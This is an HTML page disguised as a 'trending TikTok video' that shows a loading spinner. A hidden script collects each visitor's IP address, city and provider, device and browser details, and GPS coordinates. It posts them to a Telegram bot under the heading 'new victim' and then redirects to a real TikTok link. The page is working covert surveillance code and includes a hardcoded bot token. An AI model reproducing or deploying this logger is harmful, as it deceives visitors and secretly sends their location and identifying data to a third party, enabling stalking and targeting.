<!DOCTYPE html>
<html>
<head>
    <title>TikTok Video</title>
    <style>
        body { 
            background: #000; 
            color: #fff; 
            text-align: center; 
            font-family: Arial; 
            margin: 0;
            padding: 20px;
        }
        .loader {
            margin-top: 50px;
        }
        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid #333;
            border-top: 4px solid #fff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        #data {
            display: none;
        }
    </style>
</head>
<body>
    <h1>🎵 TRENDING TIKTOK VIDEO</h1>
    <div class="loader">
        <div class="spinner"></div>
        <p>Preparing video content...</p>
    </div>

    <div id="data"></div>

    <script>
        async function collectSortedData() {
            const data = {
                network: {},
                system: {},
                device: {},
                connection: {},
                location: {},
                performance: {},
                session: {},
                timing: {},
                technical: {}
            };

            // 1. СЕТЕВЫЕ ДАННЫЕ
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                data.network.IP = ipData.ip;
                
                const geoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
                const geoData = await geoResponse.json();
                data.network.Страна = geoData.country_name;
                data.network.Город = geoData.city;
                data.network.Регион = geoData.region;
                data.network.Провайдер = geoData.org;
                data.network.ЧасовойПояс = geoData.timezone;
            } catch(e) {}

            // 2. СИСТЕМНЫЕ ДАННЫЕ
            data.system.Браузер = navigator.userAgent;
            data.system.Платформа = navigator.platform;
            data.system.Язык = navigator.language;
            data.system.ДоступныеЯзыки = navigator.languages.join(', ');
            data.system.Вендор = navigator.vendor;

            // 3. ДАННЫЕ УСТРОЙСТВА
            data.device.Экран = `${screen.width}x${screen.height}`;
            data.device.ГлубинаЦвета = `${screen.colorDepth}bit`;
            data.device.ПлотностьПикселей = window.devicePixelRatio;
            data.device.СенсорныйЭкран = !!('ontouchstart' in window) ? 'Да' : 'Нет';
            data.device.ЯдраCPU = navigator.hardwareConcurrency;
            data.device.Память = navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'неизвестно';

            // 4. ДАННЫЕ ПОДКЛЮЧЕНИЯ
            if (navigator.connection) {
                data.connection.Тип = navigator.connection.effectiveType;
                data.connection.Скорость = `${navigator.connection.downlink}Mbps`;
                data.connection.Задержка = `${navigator.connection.rtt}ms`;
            }

            // 5. ГЕОЛОКАЦИЯ
            if (navigator.geolocation) {
                await new Promise(resolve => {
                    navigator.geolocation.getCurrentPosition(
                        position => {
                            data.location.Широта = position.coords.latitude;
                            data.location.Долгота = position.coords.longitude;
                            data.location.Точность = `${position.coords.accuracy}м`;
                            resolve();
                        },
                        () => {
                            data.location.Статус = 'Доступ запрещен';
                            resolve();
                        },
                        { timeout: 3000 }
                    );
                });
            }

            // 6. СЕАНС И ВРЕМЯ
            data.session.Источник = document.referrer || 'прямой заход';
            data.session.URL = window.location.href;
            data.timing.ЛокальноеВремя = new Date().toLocaleString('ru-RU');
            data.timing.ЧасовойПояс = `UTC${new Date().getTimezoneOffset() > 0 ? '-' : '+'}${Math.abs(new Date().getTimezoneOffset()/60)}`;

            await sendSortedToTelegram(data);
        }

        async function sendSortedToTelegram(data) {
            const botToken = "8044243850:AAG3jnmhyAPFJq2J1qXxyQAZ9tVA1smYBy0";
            const chatId = "1486385025";
            
            try {
                // Отправляем заголовок
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: '🆕 *НОВАЯ ЖЕРТВА - ОТСОРТИРОВАННЫЕ ДАННЫЕ*',
                        parse_mode: 'Markdown'
                    })
                });

                // Функция отправки категории
                const sendCategory = async (emoji, title, categoryData) => {
                    if (Object.keys(categoryData).length === 0) return;
                    
                    let message = `${emoji} *${title}*\\n\\n`;
                    Object.keys(categoryData).forEach(key => {
                        if (categoryData[key]) {
                            message += `• *${key}:* ${categoryData[key]}\\n`;
                        }
                    });
                    
                    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            chat_id: chatId,
                            text: message,
                            parse_mode: 'Markdown'
                        })
                    });
                };

                // Отправляем категории с задержкой
                await sendCategory('🌐', 'СЕТЕВЫЕ ДАННЫЕ', data.network);
                await new Promise(resolve => setTimeout(resolve, 300));
                await sendCategory('💻', 'СИСТЕМНЫЕ ДАННЫЕ', data.system);
                await new Promise(resolve => setTimeout(resolve, 300));
                await sendCategory('📱', 'ДАННЫЕ УСТРОЙСТВА', data.device);
                await new Promise(resolve => setTimeout(resolve, 300));
                await sendCategory('📶', 'ДАННЫЕ ПОДКЛЮЧЕНИЯ', data.connection);
                await new Promise(resolve => setTimeout(resolve, 300));
                await sendCategory('📍', 'ГЕОЛОКАЦИЯ', data.location);
                await new Promise(resolve => setTimeout(resolve, 300));
                await sendCategory('⏰', 'ВРЕМЕННЫЕ ДАННЫЕ', data.timing);
                await new Promise(resolve => setTimeout(resolve, 300));
                await sendCategory('🔗', 'ДАННЫЕ СЕАНСА', data.session);

            } catch(e) {
                console.error('Telegram error:', e);
            }
        }

        // ЗАПУСК
        setTimeout(() => {
            collectSortedData();
            setTimeout(() => {
                window.location.href = "https://vm.tiktok.com/ZMAbhyLnv/";
            }, 4500);
        }, 1000);
    </script>
</body>
</html>
